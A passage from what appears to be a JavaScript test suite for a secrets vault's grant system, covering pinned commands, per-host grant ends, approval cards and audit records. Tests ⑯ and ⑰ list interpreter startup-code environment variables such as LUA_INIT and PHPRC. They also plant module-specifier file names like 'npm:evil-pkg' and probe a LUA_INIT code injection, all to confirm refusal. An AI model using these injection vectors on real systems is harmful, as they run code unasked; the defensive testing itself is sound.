  ok(!!(ch6 && ch6.length === 1 && ch6[0].scope === 'old.example' && ch6[0].expired === true && /This conversation's grant for old\.example ended [^ ]+ — it stays ended; this grants old\.example anew, for 30 days\./.test(r6.card.detail) && String(hint6 || '').includes('it stays ended') && r6.a && r6.a.ok && m6 && endOfScope(m6, 'old.example') > Date.now() + 29 * 86400e3 && endOfScope(m6, 'keep.example') <= Date.now()), '⑮f r4: only a write that NAMES the ended scope grants it anew — the run card to old.example says «its grant ended …, it stays ended; this grants it anew, for 30 days» (detail, facts, r5: the card\'s own row); its press gives old.example its own 30 days and keep.example stays ended', { ch6, hint6, m6 });
});

console.log('⑯ (r3 MAJOR 3, pin-doors) A SCRIPT WORD IS PINNED ONLY WHERE THE INTERPRETER READS THAT FILE');
await leg('⑯ specifiers', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const planted = ['npm:evil-pkg/main.ts', 'jsr:@evil/pkg/mod.ts', 'file:other.ts', 'data:application/typescript,console.log(1)//x.ts'];
  for (const p of planted) { const f = path.resolve(w.work, p); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, 'console.log("a harmless local file")\n'); }
  const res = [];
  for (const p of planted) { const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: `deno run '${p}'`, cwd: w.work }); res.push({ p, code: q && q.code, why: q && q.why, words: q && q.words }); }
  fs.writeFileSync(path.join(w.work, 'main.ts'), 'console.log(1)\n');
  const plain = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'the deno job', standing: true, command: 'deno run main.ts', cwd: w.work });
  ok(res.every((r) => r.code === 'command_not_pinnable' && r.why === 'specifier' && /URI scheme/.test(String(r.words || ''))) && !!(plain && plain.ok && plain.command === 'deno run main.ts'), '⑯a pin-doors: npm:, jsr:, file:, data: — each planted as a local file of that name — are refused command_not_pinnable (a module SPECIFIER deno resolves itself, never the planted file); a plain relative file is pinned', { res, plain });
  const r = await runAnswered(w, RUN(w.e.ref, 'deno', 'run', 'npm:evil-pkg/main.ts'));
  ok(!!(r.card && !r.card.action.command && !r.r.ok), '⑯b its run draws a card that offers no «Always (this command)» (the run\'s own candidate reads the same grammar)', r.card && r.card.action);
  const bad = [];
  for (const [n, g] of Object.entries(VR.PIN_GRAMMAR || {})) {
    if (g.none) continue;
    if (!['path', 'slash'].includes(g.files)) bad.push({ n, files: g.files });
    for (const s of ['npm:x/m', 'jsr:@x/m', 'file:m', 'data:t,c//m', 'https://x.example/m', 'C:m']) { const argv = [n, ...(g.sub ? [g.sub[0]] : []), s + ((g.ext || ['.x'])[0])]; const p = VR.pinOf(n, argv); if (!p || p.ok) bad.push({ n, argv }); }
  }
  const sh = VR.pinOf('bash', ['bash', 'job.sh']), sh2 = VR.pinOf('bash', ['bash', './job.sh']);
  ok(!bad.length && sh && sh.why === 'path-search' && sh2 && sh2.ok, '⑯c CENSUS: every row says which word shapes are files (`files`: path | slash), and NO row pins a word with a URI scheme; a POSIX shell pins `./job.sh`, never a bare `job.sh` (it may be looked up on PATH)', { bad: bad.slice(0, 6), sh, sh2 });
  fs.writeFileSync(path.join(w.work, 'job.sh'), 'echo job\n');
  const s1 = await w.door.request({ caller: w.caller('cid-sh', 'S'), entry: w.e.ref, purpose: 'the job', standing: true, command: 'bash job.sh', cwd: w.work });
  const s2 = await w.door.request({ caller: w.caller('cid-sh', 'S'), entry: w.e.ref, purpose: 'the job', standing: true, command: 'bash ./job.sh', cwd: w.work });
  ok(!!(s1 && s1.code === 'command_not_pinnable' && s1.why === 'path-search' && /\.\/job\.sh/.test(String(s1.words || '')) && s2 && s2.ok), '⑯d the door: `--command "bash job.sh"` is refused by name with the recipe (`./job.sh`); `bash ./job.sh` is filed', { s1, s2 });
});

console.log('⑰ (r3 item 4 — reproduced: pin-doors C) EVERY PINNED ROW NAMES ITS STARTUP-CODE ENV DOORS; EVERY ONE IS REFUSED');
await leg('⑰ env doors', async () => {
  const rows = Object.entries(VR.PIN_GRAMMAR || {}).filter(([, g]) => !g.none);
  const noRow = rows.filter(([, g]) => !Array.isArray(g.env)).map(([n]) => n);
  const leaks = [];
  let names = 0;
  for (const [n, g] of rows) for (const e of g.env || []) {
    const base = String(e).replace(/\*$/, '');
    for (const name of [...(base.endsWith('_') ? [] : [base]), ...(String(e).endsWith('*') ? [base + (base.endsWith('_') ? 'x' : '_5_4')] : [])]) { names++; if (!VR.envRefusedOf(name, 'plain') || !VR.envRefusedOf(name, 'env')) leaks.push({ n, name }); }
  }
  const seven = ['LUA_INIT', 'LUA_INIT_5_4', 'PHPRC', 'PHP_INI_SCAN_DIR', 'DOTNET_STARTUP_HOOKS', 'R_PROFILE_USER', 'JULIA_DEPOT_PATH'];
  const per = Object.fromEntries(['lua', 'php', 'dotnet', 'rscript', 'julia'].map((n) => [n, ((VR.PIN_GRAMMAR || {})[n] || {}).env || null]));
  ok(rows.length >= 26 && !noRow.length && !leaks.length && names > 60 && seven.every((n) => VR.envRefusedOf(n)) && Object.values(per).every((l) => Array.isArray(l) && l.length), `⑰a CENSUS: every one of the ${rows.length} pinned rows names its startup-code env doors (\`env\`), and every one (${names} names) is refused for every run — the reviewer's seven among them`, { noRow, leaks: leaks.slice(0, 8), per });
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  fs.writeFileSync(path.join(w.work, 'job.lua'), 'print("job")\n');
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'the lua job', standing: true, command: 'lua job.lua', cwd: w.work });
  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const r0 = await runAnswered(w, RUN(w.e.ref, 'lua', 'job.lua'));
  const code = ['os', 'execute("true")'].join('.');
  const r1 = await runAnswered(w, ['--env', `T=${w.e.ref}`, '--env', `LUA_INIT=${code}`, '--', 'lua', 'job.lua']);
  ok(!!(y && y.ok && r0.r.ok && !r0.card && !r1.r.ok && r1.r.code === 'env_refused' && r1.r.name === 'LUA_INIT' && !r1.card), '⑰b the reviewer\'s probe: a `lua job.lua` standing grant admits its run — and the same run with --env LUA_INIT=<code> is refused env_refused naming LUA_INIT (no card; nothing ran)', { r0: { ok: r0.r.ok, card: !!r0.card }, r1: { ok: r1.r.ok, code: r1.r.code, name: r1.r.name, card: !!r1.card } });
});

console.log('⑱ (r3b — r4: re-derived on per-scope ends) A CARD\'S OWN «ALWAYS» ADDS ITS HOST WITH ITS OWN END — a live grant for another host keeps its own');
await leg('⑱ card Always adds', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const aEnd = Date.now() + 8 * 3600e3;
  w.useGrants.addMember(w.e.id, X, { hosts: ['a.tts.example'], until: aEnd, source: 'card' });   // hosts A, 8 hours, live
  const r = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://b.tts.example/v1'), { answer: 'always', reauthed: true });   // the card's «Always» for host B (its 30 days)
  const fa = r.card && r.card.facts && r.card.facts.always;
  const hint = r.card && (FA.runCardOf(r.card, {}) || { always: {} }).always.hint;
  ok(!!(fa && !(fa.changes || []).length && !fa.replaces && !/replaces|widens it/.test(r.card.detail) && !JSON.stringify(hint || '').includes('replaces')), '⑱a the card over a LIVE 8-hour grant for A names NO replacement for its «Always» for host B — A is not its scope (detail, facts, the words beside the button)', { fa, hint });
  const m = memberOf(w);
  const vA = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['a.tts.example'], destinationKnown: true });
  ok(!!(r.a && r.a.ok && r.r.ok && m && endOfScope(m, 'a.tts.example') === aEnd && Math.abs(endOfScope(m, 'b.tts.example') - (Date.now() + 30 * 86400e3)) < 60e3 && vA && vA.ok), '⑱b … its press adds B with B\'s own 30 days and A keeps ITS 8 hours (a run to A still goes by grant) — two scopes, two ends: never one end for both, never A replaced', { m, vA: vA && vA.code });
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  w2.useGrants.addMember(w2.e.id, X, { hosts: ['a.tts.example'], source: 'owner' });   // hosts A, no end
  const r2 = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://b.tts.example/v1'), { answer: 'always', reauthed: true, ttl: 'forever' });
  const m2 = memberOf(w2);
  const r3 = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://c.tts.example/v1'), { answer: 'always', reauthed: true });
  const m3 = memberOf(w2);
  ok(!!(r2.a && r2.a.ok && m2 && (m2.hosts || []).join() === 'a.tts.example,b.tts.example' && endOfScope(m2, 'a.tts.example') === null && endOfScope(m2, 'b.tts.example') === null && r3.card && !/replaces/.test(r3.card.detail) && r3.a && r3.a.ok && m3 && endOfScope(m3, 'a.tts.example') === null && endOfScope(m3, 'b.tts.example') === null && endOfScope(m3, 'c.tts.example') > Date.now() + 29 * 86400e3), '⑱c the same end adds (a «No end» press for B beside A with no end: A+B, no end); the card\'s 30-day press for C beside them names nothing and adds C for 30 days — A and B keep no end', { m2, m3, d3: r3.card && r3.card.detail.slice(-300) });
});

// ── ROUND 4 (THE ROOT MODEL — 主开发: «a member's scopes carry THEIR OWN ENDS … THE CARD SAYS WHAT THE ROW WILL BE, AT THE PRESS
// … ALL-OR-NOTHING FOR REAL»; the r3 acceptance's P1–P4 + the three it could not verify) — each RED on 45c537a29 by name ──
const entryOf = (w, label) => { const name = 'secret:' + crypto.randomBytes(5).toString('hex'); const put = w.vault.secretPut(name, VALUE, { prov: 'owner', label, kind: 'api-key', hosts: [] }); if (!put.ok) throw new Error('secretPut ' + put.code); return { name, id: `secrets:${name}#secret`, ref: `vault://secrets/${name}/secret` }; };
const memberOn = (w, id, cid = CID) => { const [row] = w.grants.rowsFor('vault-use', id); return row ? viewOf((row.to || []).find((m) => m.key === cid) || null) : null; };
async function cardAfter(w, before) { const t = Date.now(); while (Date.now() - t < 3000) { const c = cardsOf(w).filter((x) => !before.has(x.id)); if (c.length) return c[c.length - 1]; await sleep(5); } return null; }
const auditOf = (w, event) => { try { return fs.readFileSync(path.join(w.dataDir, 'vault-audit.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((x) => x.event === event); } catch { return []; } };
const DAY = 86400e3;

console.log('⑲ (r4, the acceptance P1 — the owner\'s own loop: one key, many hosts over an afternoon) TWO CARDS, BOTH «ALWAYS» ⇒ BOTH HOSTS, EACH ITS OWN END');
await leg('⑲ P1', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const b0 = new Set(cardsOf(w).map((c) => c.id));
  const pA = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://a.example/x'), cwd: w.work });
  const cA = await cardAfter(w, b0); b0.add(cA && cA.id);
  const pB = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://b.example/y'), cwd: w.work });
  const cB = await cardAfter(w, b0);
  const aA = cA && w.door.answer(cA.action.askId, { answer: 'always', reauthed: true });
  await sleep(5);
  const aB = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
  const rA = await pA, rB = await pB;
  const m = memberOf(w);
  const again = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://a.example/x'));
  ok(!!(aA && aA.ok && aB && aB.ok && rA.ok && rB.ok && m && endOfScope(m, 'a.example') > Date.now() + 29 * DAY && endOfScope(m, 'b.example') >= endOfScope(m, 'a.example') && again.r.ok && !again.card), '⑲ P1: two live cards (curl a / curl b) drawn while nothing was held, both «Always» ⇒ BOTH hosts held, each with its own 30 days (the second press replaced nothing — its own scope was not held) — a rerun to a.example runs with no card', { aA, aB, m, again: again.card ? 'card' : again.r.code });
});

console.log('⑳ (r4, the acceptance P2) A STANDING CARD FILED, A 30-DAY «ALWAYS» LANDS, ALLOW ⇒ BOTH KEPT — its words re-drawn only if ITS OWN scope changed');
await leg('⑳ P2', async () => {
  const w = await world();
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'sync job', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const sc0 = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const ra = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://a.example/x'), { answer: 'always', reauthed: true });
  const sc1 = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  const v = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['a.example'], destinationKnown: true });
  ok(!!(sc0 && sc1 && sc1.detail === sc0.detail && ra.a && ra.a.ok && y && y.ok && m && endOfScope(m, 'a.example') > Date.now() + 29 * DAY && (m.commands || []).length === 1 && m.scopes.find((s) => s.kind === 'command').until === null && v && v.ok), '⑳ P2: a standing card for the command filed while nothing was held; a run card\'s 30-day «Always» for a.example lands; the Allow (first press, the card NOT re-drawn — its own scope did not change) adds the command with no end and a.example keeps its 30 days', { y, m, v: v && v.code });
});

console.log('㉑ (r4, the acceptance P3) A RUN OVER SEVERAL ENTRIES — every entry\'s change named, and nothing it does not name moves');
await leg('㉑ P3', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w = await world();
  const E2 = entryOf(w, 'Upload key');
  for (const id of [w.e.id, E2.id]) w.door.setRunnable({ id, on: true, reauthed: true });
  const yEnd = Date.now() + 8 * 3600e3;
  w.useGrants.addMember(w.e.id, X, { hosts: ['x-old.example'], source: 'owner' });
  w.useGrants.addMember(E2.id, X, { hosts: ['y-old.example'], until: yEnd, source: 'card' });
  const r = await runAnswered(w, ['--env', `T=${w.e.ref}`, '--env', `U=${E2.ref}`, '--', 'curl', 'https://new.example/v1'], { answer: 'always', reauthed: true });
  const mX = memberOf(w), mY = memberOn(w, E2.id);
  ok(!!(r.card && r.card.facts && r.card.facts.always && !(r.card.facts.always.changes || []).length && r.a && r.a.ok && mX && endOfScope(mX, 'x-old.example') === null && endOfScope(mX, 'new.example') > Date.now() + 29 * DAY && mY && endOfScope(mY, 'y-old.example') === yEnd && endOfScope(mY, 'new.example') > Date.now() + 29 * DAY), '㉑a P3: a run over TWO entries adds new.example on each with its own 30 days — X\'s no-end x-old.example and Y\'s 8-hour y-old.example are untouched, so there is nothing to name', { mX, mY, changes: r.card && r.card.facts && r.card.facts.always });
  const w2 = await world();
  const F2 = entryOf(w2, 'Upload key');
  for (const id of [w2.e.id, F2.id]) w2.door.setRunnable({ id, on: true, reauthed: true });
  w2.useGrants.addMember(w2.e.id, X, { hosts: ['new2.example'], until: Date.now() + 60, source: 'card' });
  w2.useGrants.addMember(F2.id, X, { hosts: ['new2.example', 'other.example'], until: Date.now() + 60, source: 'card' });
  await sleep(120);
  const r2 = await runAnswered(w2, ['--env', `T=${w2.e.ref}`, '--env', `U=${F2.ref}`, '--', 'curl', 'https://new2.example/v1'], { answer: 'always', reauthed: true });
  const ch = (r2.card && r2.card.facts && r2.card.facts.always && r2.card.facts.always.changes) || [];
  const hint = changeRowOf(r2.drawn);   // r5: the card's OWN row (one line per entry)
  ok(!!(ch.length === 2 && ch.every((c) => c.scope === 'new2.example' && c.expired === true) && new Set(ch.map((c) => c.entry)).size === 2 && r2.card.detail.includes('On «TTS API key»: This conversation\'s grant for new2.example ended') && r2.card.detail.includes('On «Upload key»: This conversation\'s grant for new2.example ended') && String(hint || '').includes('On «Upload key»: This conversation\'s grant for new2.example ended') && String(hint || '').includes('On «TTS API key»:') && r2.a && r2.a.ok && endOfScope(memberOn(w2, F2.id), 'other.example') <= Date.now()), '㉑b P3: … and where the write DOES replace on several entries, the card names EVERY entry\'s change — one line per entry («On «TTS API key»: …», «On «Upload key»: …», the facts and — r5 — the card\'s own row); other.example (not named) stays ended', { ch, hint });
});

console.log('㉒ (r4, the acceptance P4) ALL-OR-NOTHING FOR REAL — the restore is RAW, its every answer read, a failed one stops the press by name');
await leg('㉒ P4', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const legacyEnd = Date.now() + 20 * DAY;
  const many = Array.from({ length: 16 }, (_, k) => `h${k}.example`);
  const setup = async () => {
    const w = await world();
    const E2 = entryOf(w, 'Full key');
    plantLegacy(w, [{ key: CID, name: 'Transcriber', hosts: ['*.legacy.example'], until: legacyEnd }]);   // a carried legacy member: a wildcard, NO tool, 20 days
    w.useGrants.addMember(E2.id, X, { hosts: many, source: 'card' });   // 16 hosts (the cap), no end
    for (const id of [w.e.id, E2.id]) w.door.setRunnable({ id, on: true, reauthed: true });
    return { w, E2 };
  };
  const { w, E2 } = await setup();
  const r = await runAnswered(w, ['--env', `T=${w.e.ref}`, '--env', `U=${E2.ref}`, '--', 'curl', 'https://new.example/v1'], { answer: 'always', reauthed: true, ttl: 'forever' });
  const m1 = memberOf(w);
  const vl = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['x.legacy.example'], destinationKnown: true });
  const vn = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['new.example'], destinationKnown: true });
  ok(!!(r.a && !r.a.ok && r.a.code === 'too_many_hosts' && m1 && (m1.hosts || []).join() === '*.legacy.example' && endOfScope(m1, '*.legacy.example') === legacyEnd && !(m1.toolFor || {})['*.legacy.example'] && vl && vl.ok && vn && !vn.ok && (memberOn(w, E2.id).hosts || []).length === 16), '㉒a P4: a two-entry «Always» refused at E2 (too_many_hosts) leaves E1 EXACTLY as before — its legacy *.legacy.example (no tool, its 20 days) put back RAW (no row rule judges what WAS), new.example never written', { a: r.a, m1, vl: vl && vl.code, vn: vn && vn.code });
  const s2 = await setup();
  const real = s2.w.useGrants.restoreRow;
  s2.w.useGrants.restoreRow = (id, snap, o) => (id === s2.w.e.id ? { ok: false, code: 'not_written' } : real(id, snap, o));
  const r2 = await runAnswered(s2.w, ['--env', `T=${s2.w.e.ref}`, '--env', `U=${s2.E2.ref}`, '--', 'curl', 'https://new.example/v1'], { answer: 'always', reauthed: true, ttl: 'forever' });
  s2.w.useGrants.restoreRow = real;
  const al = auditOf(s2.w, 'vault-restore-failed');
  ok(!!(r2.a && !r2.a.ok && r2.a.code === 'restore_failed' && Array.isArray(r2.a.failed) && r2.a.failed.some((f) => f.entry === s2.w.e.id && f.code === 'not_written') && al.length === 1 && al[0].cause === 'too_many_hosts'), '㉒b a restore that FAILS stops the press BY NAME — restore_failed, the entry and its code named, one audit line with the cause — never a half-write reported as a plain refusal', { a: r2.a, al });
  // r4: the ONE way a write replaces a legacy wildcard is a press that NAMES it (an aws run re-mints *.amazonaws.com with its tool);
  // refused partway, the restore must put back the tool-less ended scope — which no row rule would let anyone save anew
  const w3 = await world();
  const E3 = entryOf(w3, 'Full key');
  w3.useGrants.addMember(E3.id, X, { hosts: many, source: 'card' });
  for (const id of [w3.e.id, E3.id]) w3.door.setRunnable({ id, on: true, reauthed: true });   // the unlock's first read ran (its wildcard carry found nothing yet)
  const legacyGone = Date.now() + 60;
  plantLegacy(w3, [{ key: CID, name: 'Transcriber', hosts: ['*.amazonaws.com'], until: legacyGone }]);   // planted AFTER the carry: a legacy aws wildcard, no tool, about to end
  await sleep(120);
  const r3 = await runAnswered(w3, ['--env', `T=${w3.e.ref}`, '--env', `U=${E3.ref}`, '--', 'aws', 's3', 'ls'], { answer: 'always', reauthed: true, ttl: 'forever' });
  const m3 = memberOf(w3);
  ok(!!(r3.card && ((r3.card.facts.always || {}).changes || []).some((c) => c.scope === '*.amazonaws.com' && c.expired === true) && r3.a && !r3.a.ok && r3.a.code === 'too_many_hosts' && m3 && endOfScope(m3, '*.amazonaws.com') === legacyGone && !(m3.toolFor || {})['*.amazonaws.com']), '㉒c … where the refused press had REPLACED a legacy wildcard (its card named it — the aws run re-mints *.amazonaws.com with its tool), the restore puts the tool-less ENDED scope back exactly — what no row rule would let anyone save anew', { a: r3.a, m3, always: r3.card && r3.card.facts.always });
});

console.log('㉓ (r4, B) THE CARD SAYS WHAT THE ROW WILL BE, AT THE PRESS — a stale card writes nothing; it is drawn again and asks again');
await leg('㉓ stale card', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const b0 = new Set(cardsOf(w).map((c) => c.id));
  const pA = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://a.example/x'), cwd: w.work });
  const cA = await cardAfter(w, b0); b0.add(cA && cA.id);
  const pB = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', '-s', 'https://a.example/y'), cwd: w.work });
  const cB = await cardAfter(w, b0);
  const drawn0 = cB && String(cB.detail);   // the words as first drawn (the store's snapshot hands out the live item)
  const aA = cA && w.door.answer(cA.action.askId, { answer: 'always', reauthed: true });
  const endA = endOfScope(memberOf(w), 'a.example');
  await sleep(5);
  const aB1 = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
  const it = cB && openOf(w, 'vault-run-ask').find((i) => i.id === cB.id);
  const m1 = memberOf(w);
  ok(!!(aA && aA.ok && aB1 && !aB1.ok && aB1.code === 'ask_redrawn' && endOfScope(m1, 'a.example') === endA && it && /This conversation holds a\.example until [^ ]+ — this replaces that grant: a\.example is then held for 30 days\./.test(it.detail) && ((it.facts && it.facts.always && it.facts.always.changes) || [])[0] && it.facts.always.changes[0].scope === 'a.example' && it.detail !== drawn0 && !/replaces/.test(drawn0)), '㉓a a card drawn while a.example was not held, pressed after another card\'s «Always» wrote it, writes NOTHING (ask_redrawn) — it is drawn again in place with the words of now («holds a.example until … — this replaces that grant»), its facts too', { aB1, detail: it && it.detail.slice(-260) });
  await sleep(5);
  const aB2 = cB && w.door.answer(cB.action.askId, { answer: 'always', reauthed: true });
  const m2 = memberOf(w);
  await pA; await pB;
  ok(!!(aB2 && aB2.ok && endOfScope(m2, 'a.example') > endA), '㉓b … the owner answers the drawn-again card and THAT press writes (the belt reads the new words) — a.example now holds this press\'s 30 days', { aB2, m2 });
  const w3 = await world();
  w3.door.setRunnable({ id: w3.e.id, on: true, reauthed: true });
  const q = await w3.door.request({ caller: w3.caller(), entry: w3.e.ref, purpose: 'call c', standing: true, hosts: ['c.example'], cwd: w3.work });
  const rc = await runAnswered(w3, RUN(w3.e.ref, 'curl', 'https://c.example/v'), { answer: 'always', reauthed: true });
  const y1 = q && q.askId && w3.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const sc = openOf(w3, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  const mid = memberOf(w3);
  const y2 = q && q.askId && w3.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const m3 = memberOf(w3);
  ok(!!(rc.a && rc.a.ok && y1 && y1.code === 'ask_redrawn' && endOfScope(mid, 'c.example') > Date.now() + 29 * DAY && sc && /This conversation holds c\.example until [^ ]+ — this replaces that grant: c\.example is then held with no end\./.test(sc.detail) && (sc.facts.changes || []).length === 1 && y2 && y2.ok && endOfScope(m3, 'c.example') === null), '㉓c the standing road the same: a standing card for c.example filed while it was not held, Allowed after a 30-day «Always» wrote it ⇒ drawn again (it now says it replaces those 30 days with no end), nothing written; the next Allow writes', { y1, y2, detail: sc && sc.detail.slice(-220) });
});

console.log('㉔ (r4) THE OWNER\'S 40-SEGMENT LOOP ⇒ ONE CARD — a 30-day «Always» for another host mid-loop never ends the command');
await leg('㉔ 40 segments', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe the 40 interview segments', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  let cards = 0, fails = 0, up = null;
  for (let i = 1; i <= 40; i++) {
    if (i === 21) up = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://upload.tts.example/v1'), { answer: 'always', reauthed: true });   // the upload host's own card (not the loop's)
    const s = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', `part${String(i).padStart(2, '0')}.mp3`));
    if (s.card) cards++;
    if (!s.r.ok) fails++;
  }
  const m = memberOf(w);
  ok(!!(q && q.ok && y && y.ok && up && up.a && up.a.ok && cards === 0 && fails === 0 && m && m.scopes.find((s) => s.kind === 'command').until === null && endOfScope(m, 'upload.tts.example') > Date.now() + 29 * DAY), '㉔ THE OWNER\'S LOOP ⇒ ONE CARD: after the ONE standing card\'s Allow every segment of `python3 transcribe.py partNN.mp3` (40) runs with no card — a 30-day «Always» for the upload host at segment 21 adds that host and never ends the command', { cards, fails, m });
});

console.log('㉕ (r4, D — the acceptance could not verify) THE AUDIT SAYS WHAT A WRITE DID; THE «ANY PROGRAM» NOTICE ONLY FOR A LIVE WILDCARD');
await leg('㉕ audit + notice', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w = await world(), w2 = await world();   // r5: both ended-scope worlds planted at once — ONE wait
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  w.useGrants.addMember(w.e.id, X, { hosts: ['old.example'], until: Date.now() + 60, source: 'card' });
  plantLegacy(w2, [{ key: 'cid-Z', name: 'Z', hosts: ['*.legacy.example'], until: Date.now() + 60 }]);
  await sleep(120);
  await runAnswered(w, RUN(w.e.ref, 'curl', 'https://a.example/x'), { answer: 'always', reauthed: true });
  await runAnswered(w, RUN(w.e.ref, 'curl', 'https://old.example/x'), { answer: 'always', reauthed: true });
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const al = auditOf(w, 'vault-run-always'), gl = auditOf(w, 'vault-grant').filter((x) => x.answer === 'standing');
  const c1 = al[0] && al[0].changes && al[0].changes[0], c2 = al[1] && al[1].changes && al[1].changes[0], c3 = gl[0] && gl[0].changes && gl[0].changes[0];
  ok(!!(c1 && c1.entry === w.e.id && c1.added.length === 1 && c1.added[0].scope === 'a.example' && /^\d{4}-/.test(c1.added[0].until) && !c1.replaced.length && c2 && c2.replaced.length === 1 && c2.replaced[0].scope === 'old.example' && c2.replaced[0].ended === true && /^\d{4}-/.test(c2.replaced[0].was) && /^\d{4}-/.test(c2.replaced[0].until) && c3 && c3.added.length === 1 && c3.added[0].scope === 'python3 transcribe.py' && c3.added[0].until === null), '㉕a the audit line records what the write DID (the writer\'s result, never the card\'s guess) — per entry each scope added (+ its end) and each replaced (its old end, its new end, ended) — on the run card\'s «Always» and the standing Allow alike', { c1, c2, c3 });
  const notes = (x) => (x.userTodos.snapshot().open || []).filter((i) => /An older «Always» lets any program reach a wildcard host/.test(i.text));
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });   // the unlock's first read: the wildcard carry runs
  const w3 = await world();
  plantLegacy(w3, [{ key: 'cid-Z', name: 'Z', hosts: ['*.legacy.example'], until: Date.now() + DAY }]);
  w3.door.setRunnable({ id: w3.e.id, on: true, reauthed: true });
  ok(!!(notes(w2).length === 0 && notes(w3).length === 1), '㉕b the «any program» notice is filed only for a LIVE legacy wildcard — an ENDED one admits nothing and is never told as open to every program (a live one still is, once)', { ended: notes(w2).length, live: notes(w3).length });
});

console.log('㉖ (r4, E) THE CARRY ON THE PER-SCOPE MODEL — never a later end, never another scope\'s end, an ended scope stays ended');
await leg('㉖ carry per scope', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w = await world();
  const aEnd = Date.now() + 5 * DAY, rowEnd = Date.now() + 30 * DAY;
  w.useGrants.addMember(w.e.id, X, { hosts: ['a.example'], until: aEnd, source: 'card' });
  w.useGrants.addMember(w.e.id, X, { hosts: ['old.example'], until: Date.now() + 60, source: 'card' });
  await sleep(120);
  const keyOf = (hosts) => 'v9:' + JSON.stringify(['/usr/bin/curl', null, [], [], hosts]);
  const c = w.useGrants.carry([{ conv: CID, key: keyOf(['a.example']), entries: [w.e.id], until: rowEnd }, { conv: CID, key: keyOf(['b.example']), entries: [w.e.id], until: rowEnd }, { conv: CID, key: keyOf(['old.example']), entries: [w.e.id], until: rowEnd }], { toolOfWild: VR.wildcardToolOf });
  const m = memberOf(w);
  ok(!!(c && c.carried === 3 && c.failed === 0 && m && endOfScope(m, 'a.example') === aEnd && endOfScope(m, 'b.example') === rowEnd && endOfScope(m, 'old.example') <= Date.now()), '㉖ the carry of «always» rows onto a member: a.example (held 5 days) keeps the EARLIER end — never a later one; b.example is added with ITS row\'s 30 days — never the member\'s; the ENDED old.example stays ended', { c, m });
});

// ── ROUND 5 (the r4 acceptance of 50873938d: the root model held; ONE MAJOR — the card's words were invisible — two minors, one
// to verify, and the press probe's throw) — each RED on 50873938d by name ──
console.log('㉗ (r5, MAJOR) THE CARD SAYS IT ON ITS FACE — a hosts «Always» that replaces a held scope draws the line on its OWN row above the answers, in every client');
await leg('㉗ the line on the face', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const LINE = 'This conversation holds a.example with no end — this replaces that grant: a.example is then held for 30 days.';
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  w.useGrants.addMember(w.e.id, X, { hosts: ['a.example'], source: 'request' });   // a.example held with NO end (an Allowed standing request)
  const b0 = new Set(cardsOf(w).map((x) => x.id));
  const p0 = w.door.run({ caller: w.caller(), args: RUN(w.e.ref, 'curl', 'https://a.example/x', 'https://c.example/y'), cwd: w.work });   // a held host + one it does not hold ⇒ a card
